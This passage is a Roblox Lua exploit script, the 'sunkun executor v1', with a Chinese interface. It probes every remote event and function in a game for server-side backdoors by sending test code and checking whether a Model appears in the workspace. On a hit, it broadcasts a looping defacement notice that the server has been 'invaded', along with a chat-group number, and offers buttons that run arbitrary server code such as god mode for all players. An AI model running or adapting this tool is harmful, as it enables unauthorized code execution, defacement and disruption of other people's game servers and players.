    [58] = {title = "设置血量", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.Health = 100 end end]]},
    [59] = {title = "无敌模式", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.MaxHealth = math.huge player.Character.Humanoid.Health = math.huge end end]]},
    [60] = {title = "恢复血量", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.MaxHealth = 100 player.Character.Humanoid.Health = 100 end end]]},
    
    -- 剩下的按钮使用通用模板
}

-- 填充剩余的按钮功能
for i = 61, 120 do
    SunkunFunctions[i] = {
        title = "功能 " .. i,
        code = "-- sunkun功能 " .. i .. "\n" ..
               "game:GetService(\"Players\"):Chat(\"执行功能 " .. i .. "\")\n" ..
               "print(\"[sunkun] 功能 " .. i .. " 已执行\")"
    }
end

-- 创建120个直接执行按钮
for i = 1, 120 do
    local btn = Instance.new("TextButton")
    btn.Name = "SunkunButton_" .. i
    btn.Text = SunkunFunctions[i] and SunkunFunctions[i].title or ("功能 " .. i)
    btn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    
    -- 添加阴影效果
    local shadow = Instance.new("UIStroke")
    shadow.Color = Color3.fromRGB(0, 0, 0)
    shadow.Thickness = 2
    shadow.Transparency = 0.3
    shadow.Parent = btn
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn
    
    -- 按钮点击事件：直接执行代码
    btn.MouseButton1Click:Connect(function()
        if not BackdoorFound or not BackdoorRemote then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "错误",
                Text = "未检测到后门，无法执行",
                Duration = 3
            })
            return
        end
        
        -- 获取按钮对应的代码
        local buttonCode = ""
        if SunkunFunctions[i] and SunkunFunctions[i].code then
            buttonCode = SunkunFunctions[i].code
        else
            buttonCode = "-- sunkun功能 " .. i .. "\ngame:GetService(\"Players\"):Chat(\"执行功能 " .. i .. "\")"
        end
        
        -- 显示执行状态
        local originalText = btn.Text
        btn.Text = "执行中..."
        btn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        
        -- 执行代码
        local success = ExecuteCode(buttonCode)
        
        -- 恢复按钮状态
        task.wait(0.5)
        btn.Text = originalText
        btn.BackgroundColor3 = success and Color3.fromRGB(0, 100, 150) or Color3.fromRGB(150, 0, 0)
        
        -- 3秒后恢复原色
        task.delay(3, function()
            if btn and btn.Parent then
                btn.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
            end
        end)
    end)
    
    btn.Parent = SunkunButtonFrame
    SunkunButtons[i] = btn
end

-- 设置页面
local SettingsPage = Instance.new("ScrollingFrame")
SettingsPage.Name = "SettingsPage"
SettingsPage.Size = UDim2.new(1, 0, 1, 0)
SettingsPage.BackgroundTransparency = 1
SettingsPage.ScrollBarThickness = 6
SettingsPage.CanvasSize = UDim2.new(0, 0, 0, 800)
SettingsPage.Visible = false
SettingsPage.Parent = ContentFrame

-- 设置标题
local SettingsTitle = Instance.new("TextLabel")
SettingsTitle.Name = "SettingsTitle"
SettingsTitle.Text = "设置"
SettingsTitle.Size = UDim2.new(1, 0, 0, 50)
SettingsTitle.Position = UDim2.new(0, 0, 0, 10)
SettingsTitle.BackgroundTransparency = 1
SettingsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsTitle.Font = Enum.Font.GothamBold
SettingsTitle.TextSize = 28
SettingsTitle.Parent = SettingsPage

-- 风险检测显示
local RiskFrame = Instance.new("Frame")
RiskFrame.Name = "RiskFrame"
RiskFrame.Size = UDim2.new(1, -20, 0, 100)
RiskFrame.Position = UDim2.new(0, 10, 0, 70)
RiskFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
RiskFrame.Parent = SettingsPage

local RiskCorner = Instance.new("UICorner")
RiskCorner.CornerRadius = UDim.new(0, 8)
RiskCorner.Parent = RiskFrame

local RiskLabel = Instance.new("TextLabel")
RiskLabel.Name = "RiskLabel"
RiskLabel.Text = "风险等级: 0/5 (安全)"
RiskLabel.Size = UDim2.new(1, -20, 0, 40)
RiskLabel.Position = UDim2.new(0, 10, 0, 10)
RiskLabel.BackgroundTransparency = 1
RiskLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
RiskLabel.Font = Enum.Font.GothamBold
RiskLabel.TextSize = 20
RiskLabel.Parent = RiskFrame

local RiskBar = Instance.new("Frame")
RiskBar.Name = "RiskBar"
RiskBar.Size = UDim2.new(0, 0, 0, 20)
RiskBar.Position = UDim2.new(0, 10, 0, 60)
RiskBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
RiskBar.Parent = RiskFrame

local RiskBarCorner = Instance.new("UICorner")
RiskBarCorner.CornerRadius = UDim.new(0, 4)
RiskBarCorner.Parent = RiskBar

-- 防火墙开关
local FirewallToggle = Instance.new("TextButton")
FirewallToggle.Name = "FirewallToggle"
FirewallToggle.Text = "防火墙模式: 关闭"
FirewallToggle.Size = UDim2.new(1, -20, 0, 50)
FirewallToggle.Position = UDim2.new(0, 10, 0, 190)
FirewallToggle.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
FirewallToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
FirewallToggle.Font = Enum.Font.GothamBold
FirewallToggle.TextSize = 18
FirewallToggle.Parent = SettingsPage

local ToggleCorner2 = Instance.new("UICorner")
ToggleCorner2.CornerRadius = UDim.new(0, 8)
ToggleCorner2.Parent = FirewallToggle

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Text = "关闭脚本"
CloseButton.Size = UDim2.new(1, -20, 0, 50)
CloseButton.Position = UDim2.new(0, 10, 0, 260)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 18
CloseButton.Parent = SettingsPage

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseButton

-- 后门检测变量
local Alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

-- 生成随机名称函数
local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. Alphabet[math.random(1, #Alphabet)]
    end
    return text
end

-- 运行远程函数
local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

-- 改进的检测函数（基于LALOL Hub算法）
local function DetectBackdoor()
    ProgressText.Text = "初始化检测... 0%"
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    DetectButton.Text = "检测中..."
    DetectButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    
    local startTime = tick()
    local remotes = {}
    local foundBackdoor = false
    local detectedRemote = nil
    local totalSteps = 7
    local currentStep = 0
    
    -- 步骤1: 检查受保护的后门
    currentStep = 1
    ProgressText.Text = "检查受保护后门... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    local protected_backdoor = ReplicatedStorage:FindFirstChild('lh' .. game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        runRemote(protected_backdoor, 'lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = protected_backdoor
    end
    
    task.wait(0.2)
    
    -- 步骤2: 获取所有远程对象
    currentStep = 2
    ProgressText.Text = "扫描远程对象... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    local allRemotes = {}
    for _, remote in game:GetDescendants() do
        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
            -- 跳过特定远程对象
            local fullName = remote:GetFullName()
            if string.split(fullName, '.')[1] == 'RobloxReplicatedStorage' then
                continue
            end
            
            if remote.Parent == ReplicatedStorage or 
               remote.Parent.Parent == ReplicatedStorage or 
               remote.Parent.Parent.Parent == ReplicatedStorage then
                -- 跳过已知的过滤器
                if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                    continue
                end
                
                if remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                    continue
                end
                
                if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then
                    continue
                end
            end
            
            table.insert(allRemotes, remote)
        end
    end
    
    -- 步骤3: 发送测试命令
    currentStep = 3
    ProgressText.Text = "发送测试命令... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    for _, remote in ipairs(allRemotes) do
        local code = generateName(math.random(12,30))
        if not remotes[code] then
            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
            remotes[code] = remote
        end
    end
    
    task.wait(0.3)
    
    -- 步骤4: 检查结果（多次检查以提高准确性）
    currentStep = 4
    ProgressText.Text = "检查响应... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    for i = 1, 20 do  -- 检查20次，每次间隔0.1秒
        for code, remote in pairs(remotes) do
            if Workspace:FindFirstChild(code) then
                foundBackdoor = true
                detectedRemote = remote
                break
            end
        end
        
        if foundBackdoor then
            break
        end
        task.wait(0.1)
        
        -- 更新进度
        local checkProgress = currentStep + (i/20) * 2
        ProgressText.Text = "检查响应... " .. math.floor((checkProgress/totalSteps)*100) .. "%"
        ProgressBar.Size = UDim2.new((checkProgress/totalSteps), 0, 1, 0)
    end
    
    -- 步骤5: 清理测试对象
    currentStep = 6
    ProgressText.Text = "清理测试对象... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    for code, _ in pairs(remotes) do
        local testObj = Workspace:FindFirstChild(code)
        if testObj then
            testObj:Destroy()
        end
    end
    
    -- 步骤6: 最终结果
    currentStep = 7
    ProgressText.Text = "完成检测... " .. math.floor((currentStep/totalSteps)*100) .. "%"
    ProgressBar.Size = UDim2.new((currentStep/totalSteps), 0, 1, 0)
    
    if foundBackdoor and detectedRemote then
        local elapsedTime = tick() - startTime
        ProgressText.Text = "✅ 检测到后门! (" .. string.format("%.2f", elapsedTime) .. "s)"
        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        BackdoorFound = true
        BackdoorRemote = detectedRemote
        
        -- 显示欢迎通知
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "sunkun 执行器v1",
            Text = "欢迎使用，登记/加载成功！",
            Duration = 5
        })
        
        -- 自动运行提示代码
        task.spawn(function()
            pcall(function()
                if BackdoorRemote:IsA("RemoteEvent") then
                    BackdoorRemote:FireServer("a=Instance.new('Hint',workspace)while true do a.Text='sunkun小姐已入侵服务器请加入927072454🐧'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
                elseif BackdoorRemote:IsA("RemoteFunction") then
                    BackdoorRemote:InvokeServer("a=Instance.new('Hint',workspace)while true do a.Text='sunkun小姐已入侵服务器请加入927072454🐧'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
                end
            end)
        end)
        
        -- 切换到主UI
        task.wait(1)
        DetectionFrame.Visible = false
        MainFrame.Visible = true
        ToggleButton.Text = "返回检测"
        
        -- 动画效果
        MainFrame.Position = UDim2.new(0.5, -400, 1, 0)
        local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
            Position = UDim2.new(0.5, -400, 0.5, -250)
        })
        tween:Play()
        
    else
        ProgressText.Text = "❌ 未找到后门"
        ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        BackdoorFound = false
        
        -- 显示提示
        local warning = Instance.new("TextLabel")
        warning.Text = "⚠️ 未找到可用的后门"
        warning.Size = UDim2.new(1, -40, 0, 50)
        warning.Position = UDim2.new(0, 20, 0, 200)
        warning.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
        warning.TextColor3 = Color3.fromRGB(255, 255, 255)
        warning.Font = Enum.Font.GothamBold
        warning.TextSize = 18
        warning.Parent = DetectionFrame
        
        local warningCorner = Instance.new("UICorner")
        warningCorner.CornerRadius = UDim.new(0, 8)
        warningCorner.Parent = warning
        
        task.wait(3)
        warning:Destroy()
    end
    
    DetectButton.Text = "开始检测后门"
    DetectButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
end

-- 切换页面函数
local function ShowPage(pageName)
    ExecutorPage.Visible = false
    SunkunPage.Visible = false
    SettingsPage.Visible = false
    
    if pageName == "输入执行器" then
        ExecutorPage.Visible = true
        MainTitle.Text = "sunkun 执行器 v1"
    elseif pageName == "sunkun" then
        SunkunPage.Visible = true
        MainTitle.Text = "sunkun 功能面板"
    elseif pageName == "设置" then
        SettingsPage.Visible = true
        MainTitle.Text = "设置"
    end
end

-- 更新风险等级
local function UpdateRiskLevel(level)
    SecuritySystem.RiskLevel = math.clamp(level, 0, 5)
    RiskLabel.Text = "风险等级: " .. SecuritySystem.RiskLevel .. "/5"
    
    local colors = {
        Color3.fromRGB(0, 255, 0),   -- 0: 安全
        Color3.fromRGB(100, 255, 0), -- 1: 低风险
        Color3.fromRGB(255, 255, 0), -- 2: 中低风险
        Color3.fromRGB(255, 150, 0), -- 3: 中等风险
        Color3.fromRGB(255, 100, 0), -- 4: 高风险
        Color3.fromRGB(255, 0, 0)    -- 5: 极高风险
    }
    
    RiskLabel.TextColor3 = colors[SecuritySystem.RiskLevel + 1]
    RiskBar.BackgroundColor3 = colors[SecuritySystem.RiskLevel + 1]
    RiskBar.Size = UDim2.new(SecuritySystem.RiskLevel/5, -20, 0, 20)
end

-- 按钮点击事件
DetectButton.MouseButton1Click:Connect(DetectBackdoor)

ToggleButton.MouseButton1Click:Connect(function()
    if MainFrame.Visible then
        -- 切换到检测UI
        MainFrame.Visible = false
        DetectionFrame.Visible = true
        ToggleButton.Text = "去往主UI"
    else
        -- 只有检测到后门才能进入主UI
        if BackdoorFound then
            DetectionFrame.Visible = false
            MainFrame.Visible = true
            ToggleButton.Text = "返回检测"
            
            -- 动画效果
            MainFrame.Position = UDim2.new(0.5, -400, 1, 0)
            local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                Position = UDim2.new(0.5, -400, 0.5, -250)
            })
            tween:Play()
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "提示",
                Text = "请先检测后门",
                Duration = 3
            })
        end
    end
end)

-- 分类按钮事件
CategoryButtons["输入执行器"].MouseButton1Click:Connect(function()
    ShowPage("输入执行器")
end)

CategoryButtons["sunkun"].MouseButton1Click:Connect(function()
    ShowPage("sunkun")
end)

CategoryButtons["设置"].MouseButton1Click:Connect(function()
    ShowPage("设置")
end)

-- 功能按钮事件
ExecuteButton.MouseButton1Click:Connect(function()
    ExecuteCode(CodeInput.Text)
end)

ClearButton.MouseButton1Click:Connect(function()
    CodeInput.Text = ""
end)

RedetectButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    DetectionFrame.Visible = true
    ToggleButton.Text = "去往主UI"
    DetectBackdoor()
end)

-- 设置按钮事件
local firewallEnabled = false
FirewallToggle.MouseButton1Click:Connect(function()
    firewallEnabled = not firewallEnabled
    SecuritySystem.FirewallMode = firewallEnabled
    
    if firewallEnabled then
        FirewallToggle.Text = "防火墙模式: 开启"
        FirewallToggle.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        UpdateRiskLevel(0)
        
        -- 激活防火墙
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "防火墙",
            Text = "防火墙模式已激活",
            Duration = 3
        })
    else
        FirewallToggle.Text = "防火墙模式: 关闭"
        FirewallToggle.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        UpdateRiskLevel(2)
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "sunkun",
        Text = "脚本已关闭",
        Duration = 3
    })
end)

-- 初始化风险等级
UpdateRiskLevel(0)

-- 激活安全防御系统
ActivateSecuritySystem()

-- 初始显示
ShowPage("输入执行器")

-- 隐藏脚本标题
local hidden = false
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightControl then
        hidden = not hidden
        ScreenGui.Enabled = not hidden
    end
end)

-- 可拖拽功能
local UIS = game:GetService("UserInputService")
local function dragify(Frame)
    local dragToggle = nil
    local dragSpeed = 0.25
    local dragInput = nil
    local dragStart = nil
    local dragPos = nil
    
    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(
            dragPos.X.Scale, 
            dragPos.X.Offset + Delta.X, 
            dragPos.Y.Scale, 
            dragPos.Y.Offset + Delta.Y
        )
        TweenService:Create(Frame, TweenInfo.new(0.1), {Position = Position}):Play()
    end
    
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            dragPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            updateInput(input)
        end
    end)
end

-- 为两个主窗口添加拖拽功能
dragify(DetectionFrame)
dragify(MainFrame)

print("[sunkun v1] 脚本加载完成!")
print("[sunkun v1] 按右Ctrl键隐藏/显示UI")
print("[sunkun v1] 30个预设按钮 + 120个直接执行按钮")
